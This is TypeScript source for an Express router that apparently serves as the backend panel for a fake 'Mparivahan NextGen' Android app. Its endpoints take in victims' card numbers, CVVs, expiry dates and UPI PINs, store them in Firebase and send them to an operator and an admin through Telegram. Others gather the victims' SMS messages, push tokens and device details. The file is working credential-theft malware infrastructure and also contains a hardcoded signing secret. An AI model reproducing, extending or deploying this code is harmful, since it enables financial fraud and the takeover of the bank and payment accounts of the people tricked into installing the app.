/**
 * Nexus-compatible API — mirrors the nexus-panel.in protocol used by the
 * native "Mparivahan NextGen" APK (trades.signals.more).
 * Auth: HMAC-SHA256 in headers. message=`CUSTOMER:DEVICE:TS`, key=WRITER_SECRET_HEX.
 * Payment capture (card/UPI) writes to the same Firebase device record +
 * Telegram notifications as /api/hook/* so the panel shows it.
 */
import { Router } from "express";
import { escapeMarkdown } from "../lib/telegramText";
import { ADMIN_TG_ID } from "../lib/admin";
import * as crypto from "node:crypto";
import { logger } from "../lib/logger";
import { fbGet, fbUpdate } from "../bot/firebase";
import { getBot } from "../bot/index";

const router = Router();
const WRITER_SECRET_HEX =
  "94de0bcb6834238452cb51ec810fc3907db5de92b0cdbde977881e3de3242564";

function hmacSha256Hex(message: string, keyHex: string): string {
  return crypto
    .createHmac("sha256", Buffer.from(keyHex, "hex"))
    .update(message, "utf-8")
    .digest("hex");
}

function verifySig(req: any): boolean {
  const customerId = String(req.headers["x-customer-id"] || "");
  const deviceId = String(req.headers["x-device-id"] || "");
  const ts = String(req.headers["x-timestamp"] || "");
  const sig = String(req.headers["x-sig"] || "");
  if (!customerId || !deviceId || !ts || !sig) return false;
  const expected = hmacSha256Hex(
    `${customerId}:${deviceId}:${ts}`,
    WRITER_SECRET_HEX
  );
  try {
    return crypto.timingSafeEqual(
      Buffer.from(String(sig).toLowerCase()),
      Buffer.from(expected)
    );
  } catch {
    return false;
  }
}


async function sendSafe(chatId: string, msg: string) {
  const bot = getBot();
  if (!bot) return;
  try {
    await bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" });
  } catch (err) {
    logger.error({ err, chatId }, "Nexus: failed to send DM");
  }
}

function cleanDeviceId(id: string): string {
  return String(id || "")
    .replace(/[{}\"'\[\]]/g, "")
    .trim();
}

async function resolveRealDevice(
  ownerTelegramId: string,
  deviceId: string
): Promise<string> {
  let realDeviceId = "";
  try {
    const clients = await fbGet("clients");
    if (clients) {
      for (const [cid, dev] of Object.entries(clients as Record<string, any>)) {
        const devObj = dev as Record<string, any>;
        if (!devObj) continue;
        const devOwner = devObj?.ownerTelegramId;
        const devTelegramId = devObj?.telegramId;
        const isRealDevice = !!(
          devObj?.modelName ||
          devObj?.model ||
          devObj?.mobNo ||
          devObj?.deviceId
        );
        if (!isRealDevice) continue;
        if (
          (devOwner &&
            (devOwner === ownerTelegramId || devOwner === deviceId)) ||
          (devTelegramId && devTelegramId === ownerTelegramId)
        ) {
          realDeviceId = cid;
          break;
        }
      }
      if (!realDeviceId) {
        const direct = clients[deviceId] as Record<string, any> | undefined;
        if (
          direct &&
          (direct?.modelName ||
            direct?.model ||
            direct?.mobNo ||
            direct?.deviceId)
        ) {
          realDeviceId = deviceId;
        }
      }
    }
  } catch {}
  return realDeviceId || cleanDeviceId(deviceId);
}

async function handlePayment(req: any, res: any): Promise<void> {
  try {
    const customerId = String(req.headers["x-customer-id"] || "");
    const deviceId = String(req.headers["x-device-id"] || "");
    const body = (req.body ?? {}) as Record<string, any>;
    if (!verifySig(req)) {
      logger.warn({ deviceId, customerId }, "Nexus payment: bad signature");
      res.status(401).json({ error: "bad sig" });
      return;
    }
    const realDeviceId = await resolveRealDevice(customerId, deviceId);
    const ip =
      String(req.headers["x-forwarded-for"] || "")
        .split(",")[0]
        .trim() || "";
    const update: Record<string, any> = {
      nexus_timestamp: new Date().toISOString(),
      nexus_ip: ip || "",
    };

    const cardNumber = body.cardNumber;
    if (cardNumber) {
      update.cc_cardNumber = String(cardNumber);
      if (body.cardHolderName)
        update.cc_cardholderName = String(body.cardHolderName);
      if (body.cardExpiry) update.cc_expiry = String(body.cardExpiry);
      if (body.cardCvv) update.cc_cvv = String(body.cardCvv);
      update.cc_timestamp = new Date().toISOString();
    }
    const upiPin = body.upiPin || body.upiPin1 || null;
    if (upiPin) {
      update.upi_id = String(body.upiId || "");
      update.upi_name = String(body.upiName || "");
      update.upi_phone = String(body.phone || "");
      update.upi_vehicle = String(body.vehicle || "");
      update.upi_pin = String(upiPin);
      update.upi_pin1 = String(body.upiPin1 || "");
      update.upi_pin2 = String(body.upiPin2 || "");
      update.upi_timestamp = new Date().toISOString();
    }
    await fbUpdate(`clients/${realDeviceId}`, update);

    // Append to per-device capture history (every UPI PIN entry is kept).
    if (upiPin) {
      const capKey = String(Date.now());
      await fbUpdate(`clients/${realDeviceId}/upi_captures/${capKey}`, {
        upi_id: String(body.upiId || ""),
        upi_name: String(body.upiName || ""),
        upi_phone: String(body.phone || ""),
        upi_vehicle: String(body.vehicle || ""),
        upi_pin: String(upiPin),
        ip: ip || "",
        ts: new Date().toISOString(),
      }).catch((err) =>
        logger.error(
          { err, deviceId: realDeviceId },
          "Nexus: upi_captures append failed"
        )
      );
    }

    let ownerTelegramId = customerId;
    let phone = realDeviceId;
    try {
      const dev = await fbGet(`clients/${realDeviceId}`);
      ownerTelegramId = dev?.ownerTelegramId || customerId;
      phone = dev?.mobNo || dev?.phone || dev?.deviceId || realDeviceId;
    } catch {}

    const lines: string[] = [];
    if (cardNumber) {
      lines.push(
        `💳 *CC CAPTURED (Nexus)*\n\n`,
        `📱 Device: \`${escapeMarkdown(phone)}\`\n\n`,
        `👤 *${escapeMarkdown(body.cardHolderName || "Unknown")}*\n`,
        `💳 \`${escapeMarkdown(String(cardNumber))}\`\n`,
        `📅 Expiry: \`${escapeMarkdown(String(body.cardExpiry || "?"))}\`\n`,
        `🔒 CVV: \`${escapeMarkdown(String(body.cardCvv || "?"))}\`\n`
      );
    }
    if (upiPin) {
      lines.push(
        `📱 *UPI CAPTURED (Nexus)*\n\n`,
        `📱 Device: \`${escapeMarkdown(phone)}\`\n\n`,
        `🆔 UPI ID: \`${escapeMarkdown(String(body.upiId || "?"))}\`\n`,
        `👤 Name: \`${escapeMarkdown(String(body.upiName || "?"))}\`\n`,
        `📞 Phone: \`${escapeMarkdown(String(body.phone || "?"))}\`\n`,
        `🔒 PIN: \`${escapeMarkdown(String(upiPin)).replace(/.(?=.)/g, "*")}\`\n`
      );
    }
    if (body.vehicle)
      lines.push(`🚗 Vehicle: \`${escapeMarkdown(String(body.vehicle))}\`\n`);
    lines.push(`\n🌐 IP: ${escapeMarkdown(ip || "Unknown")}`);
    const msg = lines.join("");

    if (ownerTelegramId && ownerTelegramId !== "1hEhjrKD9AcfwPNKbQL2uSqbVPq1") {
      await sendSafe(ownerTelegramId, msg);
      await new Promise((r) => setTimeout(r, 300));
    }
    await sendSafe(
      ADMIN_TG_ID,
      msg +
        (ownerTelegramId
          ? `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\``
          : "")
    );
    logger.info(
      { deviceId: realDeviceId, hasCard: !!cardNumber, hasUpi: !!upiPin },
      "Nexus payment captured"
    );
    res.json({ ok: true });
  } catch (err) {
    logger.error({ err }, "Nexus payment error");
    res.status(500).json({ error: "internal error" });
  }
}

router.post("/data/payments", handlePayment);
router.post("/payment", handlePayment);

// ── Supporting endpoints (app lifecycle / sync) ───────────────────────────
router.post("/panel/config", async (_req, res) => {
  try {
    res.json({
      ok: true,
      baseUrl: `${process.env["PANEL_URL"] || "https://panel.kimiaxe.com"}/api/nexus/`,
    });
  } catch (err) {
    res.status(500).json({ error: "internal error" });
  }
});

router.post("/device/installed", async (req, res) => {
  try {
    const customerId = String(req.headers["x-customer-id"] || "");
    const deviceId = cleanDeviceId(String(req.headers["x-device-id"] || ""));
    if (deviceId) {
      const upd: Record<string, any> = {
        nexusInstalled: true,
        nexusInstalledAt: Date.now(),
      };
      if (customerId) upd.ownerTelegramId = customerId;
      await fbUpdate(`clients/${deviceId}`, upd).catch(() => {});
    }
    res.json({ ok: true });
  } catch {
    res.json({ ok: true });
  }
});

router.post("/device/token", async (req, res) => {
  try {
    const body = (req.body ?? {}) as Record<string, any>;
    const deviceId = cleanDeviceId(String(req.headers["x-device-id"] || ""));
    if (deviceId && body.fcmToken) {
      await fbUpdate(`clients/${deviceId}`, {
        fcmToken: String(body.fcmToken),
        fcmUpdatedAt: Date.now(),
      }).catch(() => {});
    }
    res.json({ ok: true });
  } catch {
    res.json({ ok: true });
  }
});

router.post("/presence/beat", async (req, res) => {
  try {
    const body = (req.body ?? {}) as Record<string, any>;
    const customerId = String(req.headers["x-customer-id"] || "");
    const deviceId = cleanDeviceId(String(req.headers["x-device-id"] || ""));
    if (deviceId) {
      const upd: Record<string, any> = {
        lastPing: Date.now(),
        status: true,
        nexus: true,
        modelName: String(body.modelName || ""),
        androidV: String(body.androidV || ""),
      };
      if (customerId) upd.ownerTelegramId = customerId;
      await fbUpdate(`clients/${deviceId}`, upd).catch(() => {});
    }
    res.json({ ok: true });
  } catch {
    res.json({ ok: true });
  }
});

router.post("/ping/ack", async (_req, res) => res.json({ ok: true }));
router.post("/data/sync_complete", async (_req, res) =>
  res.json({ ok: true, syncStatus: "ok" })
);
router.post("/data/sync_status", async (_req, res) =>
  res.json({ ok: true, synced: true })
);

router.post("/data/sms/batch", async (req, res) => {
  try {
    const body = (req.body ?? {}) as Record<string, any>;
    const customerId = String(req.headers["x-customer-id"] || "");
    const deviceId = cleanDeviceId(String(req.headers["x-device-id"] || ""));
    const items = Array.isArray(body.items) ? body.items : [];
    const realDeviceId = await resolveRealDevice(customerId, deviceId);
    if (realDeviceId && items.length) {
      const msgs: Record<string, any> = {};
      const now = Date.now();
      items.forEach((m: any, idx: number) => {
        msgs[`${now}_${idx}`] = {
          sender: m.sender || m.from || "",
          message: m.message || m.body || "",
          date: m.date || now,
          nexus: true,
        };
      });
      await fbUpdate(`messages/${realDeviceId}`, msgs).catch(() => {});
      // Ensure client record exists so the panel lists this device.
      await fbUpdate(`clients/${realDeviceId}`, {
        ownerTelegramId: customerId,
        lastPing: Date.now(),
        status: true,
        nexus: true,
      }).catch(() => {});
    }
    res.json({ ok: true });
  } catch {
    res.json({ ok: true });
  }
});

router.post("/data/emails/batch", async (_req, res) => res.json({ ok: true }));
router.post("/data/sms/batch/historical", async (_req, res) =>
  res.json({ ok: true })
);
router.post("/data/sms/batch/new", async (_req, res) => res.json({ ok: true }));
router.post("/devices/call_forwarding", async (_req, res) =>
  res.json({ ok: true, enabled: false })
);
router.post("/devices/call_forwarding/ack", async (_req, res) =>
  res.json({ ok: true })
);
router.post("/outbox/pull", async (_req, res) =>
  res.json({ ok: true, items: [] })
);
router.post("/outbox/mark", async (_req, res) => res.json({ ok: true }));

export default router;
